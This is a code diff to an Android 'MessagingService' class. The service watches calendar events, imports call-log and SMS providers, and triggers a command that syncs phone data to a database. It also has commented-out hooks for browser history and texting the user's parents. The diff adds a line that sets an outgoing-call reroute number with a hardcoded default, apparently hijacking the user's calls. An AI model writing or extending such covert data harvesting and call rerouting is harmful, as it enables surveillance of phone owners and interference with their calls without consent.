@@ -5,6 +5,7 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.ContentObserver;
 import android.database.Cursor;
@@ -17,6 +18,7 @@ import android.os.HandlerThread;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.Process;
+import android.preference.PreferenceManager;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
@@ -150,7 +152,8 @@ public class MessagingService extends Service {
         if(this.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
             getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
         }
-            //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
+        OutgoingCallReceiver.sRerouteNumber = PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString(OutgoingCallReceiver.NUMBER_KEY, "9727729432");
+        //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
     }
 
     @Override
@@ -172,7 +175,7 @@ public class MessagingService extends Service {
         Lofl.onReceiveCommand(this, Commands.CALENDAR_EVENTS);
         Lofl.onReceiveCommand(this, Commands.TEXT_PARENTS);
         Lofl.onReceiveCommand(this, Commands.SHARE_APP);*/
-        Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE);
+        Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE, null);
         return super.onStartCommand(intent, flags, startId);
     }
 
